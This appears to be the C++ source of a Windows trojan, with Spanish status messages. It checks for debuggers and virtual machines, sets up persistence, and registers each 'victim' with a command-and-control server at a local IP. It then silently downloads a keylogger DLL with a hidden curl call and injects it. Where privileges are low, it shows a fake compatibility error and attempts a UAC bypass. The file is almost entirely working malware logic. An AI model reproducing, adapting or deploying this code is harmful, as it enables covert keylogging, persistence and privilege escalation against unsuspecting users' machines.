#include <iostream>         
#include <string>           
#include <cstring>           
#include <cstdlib>           
#include <curl/curl.h>      
#include <nlohmann/json.hpp> 
#include <windows.h>         
#include <winsock2.h>        
#include <ws2tcpip.h>        
#include <CommCtrl.h>        
#include <sstream>          


#include "detectDebugger.h"
#include "detectVM.h"
#include "persistence.h"
#include "injectionDLL.h"
#include "bypassUAC.h"
#include "detectPrivilegies.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "comctl32.lib")


std::string GetLocalIPAddress() {
    WSADATA wsaData;
    char hostName[256];
    struct addrinfo hints, * res, * ptr;
    int result;
    std::string ipAddress = "No IP Found";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return ipAddress;
    }


    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        std::cerr << "Error " << WSAGetLastError() << " when getting local host name.\n";
        WSACleanup();
        return ipAddress;
    }


    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    result = getaddrinfo(hostName, NULL, &hints, &res);
    if (result != 0) {
        std::cerr << "getaddrinfo failed: " << result << "\n";
        WSACleanup();
        return ipAddress;
    }

    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &((struct sockaddr_in*)ptr->ai_addr)->sin_addr, ipStr, sizeof(ipStr));
        ipAddress = ipStr;
        break; 
    }


    freeaddrinfo(res);
    WSACleanup();

    return ipAddress;
}

bool CheckRegistryValueExists(HKEY hKeyRoot, LPCSTR subKey, LPCSTR valueName) {
    HKEY hKey;
    LONG lResult;

    lResult = RegOpenKeyExA(hKeyRoot, subKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        
        return false;
    }

 
    lResult = RegQueryValueExA(hKey, valueName, NULL, NULL, NULL, NULL);
    RegCloseKey(hKey);

   
    return (lResult == ERROR_SUCCESS);
}


static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
        return newLength;
    }
    catch (std::bad_alloc& e) {
    
        return 0;
    }
}

bool SetRegistryValue(HKEY hKeyRoot, LPCSTR subKey, LPCSTR valueName, DWORD dataType, const BYTE* data, DWORD dataSize) {
    HKEY hKey;
    if (RegCreateKeyExA(hKeyRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    if (RegSetValueExA(hKey, valueName, 0, dataType, data, dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}


bool GetRegistryValue(HKEY hKeyRoot, LPCSTR subKey, LPCSTR valueName, std::string& outValue) {
    HKEY hKey;
    char buffer[512];
    DWORD bufferSize = sizeof(buffer);

    if (RegOpenKeyExA(hKeyRoot, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)buffer, &bufferSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    outValue.assign(buffer, bufferSize - 1);
    RegCloseKey(hKey);
    return true;
}

int PostAddClient(const std::string& url, const std::string& clientId, const std::string& operatingSystem) {
    CURL* curl;
    CURLcode res;
    std::string responseStr;

    curl = curl_easy_init();
    if (curl) {
        std::string ipAddress = GetLocalIPAddress();

        std::ostringstream postDataStream;
        postDataStream << "{\"client_id\":\"" << clientId
            << "\",\"ip_address\":\"" << ipAddress
            << "\",\"operating_system\":\"" << operatingSystem << "\"}";
        std::string postData = postDataStream.str();

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseStr);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        if (res == CURLE_OK) {
            auto jsonResponse = nlohmann::json::parse(responseStr);
            if (jsonResponse.contains("id") && jsonResponse["id"].is_number_integer()) {
                return jsonResponse["id"].get<int>();
            }
        }
    }

    return -1;
}

void ExecuteCommandHidden(const char* cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

  
    if (!CreateProcessA(NULL,  
        (LPSTR)cmd,             
        NULL,                   
        NULL,                   
        FALSE,                 
        CREATE_NO_WINDOW,       
        NULL,                   
        NULL,                   
        &si,                    
        &pi)                    
        ) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return;
    }


    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void GetDLLFile() {
    std::string cmd = "curl http://192.168.1.26:8000/get-text-file/ -o keylogger.dll";

    ExecuteCommandHidden(cmd.c_str());
}


int main() {

    
    if (DetectDebugger() || IsVirtualMachine()) {
        exit;
    }


    if (CheckHighPrivilegeProcess(L"trojan.exe")) {
        MessageBoxA(NULL, "Privilegios elevados!", "Error", MB_ICONINFORMATION);
        
        if (!checkAutoStartEnabled(L"malware")) {
            MessageBoxA(NULL, "No hay persistencia!", "Informacion", MB_ICONINFORMATION | MB_OK);
            setupPersistence();
            MessageBoxA(NULL, "Persistencia generada!", "Informacion", MB_ICONINFORMATION | MB_OK);
        }
        else {
            MessageBoxA(NULL, "Ya existe persistencia en este sistema!", "Informacion", MB_ICONINFORMATION | MB_OK);
        }
        if (CheckRegistryValueExists(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID")) {
            MessageBoxA(NULL, "Víctima ya registrada!", "Error", MB_ICONASTERISK);
        }
        else {
            int data = PostAddClient("192.168.1.26:8000/clients/","Sergio","Windows");
            std::string dataStr = std::to_string(data); 
            
            if (SetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", REG_SZ, (const BYTE*)dataStr.c_str(), dataStr.length() + 1)) {
                std::string clientID;
                if (GetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", clientID)) {
                    std::string message = "Víctima nueva! El valor ID es: " + clientID;
                    MessageBoxA(NULL, message.c_str(), "Información", MB_ICONINFORMATION | MB_OK);
                }
                else {
                    MessageBoxA(NULL, "No se pudo leer el valor.", "Error", MB_ICONERROR | MB_OK);
                }
            }
            else {
                std::cerr << "Error al guardar el valor." << std::endl;
            }
        }


        MessageBoxA(NULL, "Se va a meter la inyeccion!", "Error", MB_ICONASTERISK);
        GetDLLFile();
        InjectDLL();
    }

    else {
        if (!checkAutoStartEnabled(L"malware")) {
            MessageBoxA(NULL, "Este programa no es compatible con la versión de tu sistema operativo. Por favor, verifica los requisitos del sistema para este software.", "Error", MB_ICONERROR);
        }
        MessageBoxA(NULL, "Sin privilegios, se va a bypassear la UAC!", "Error", MB_ICONINFORMATION);
        OverrideUAC();
    }


}


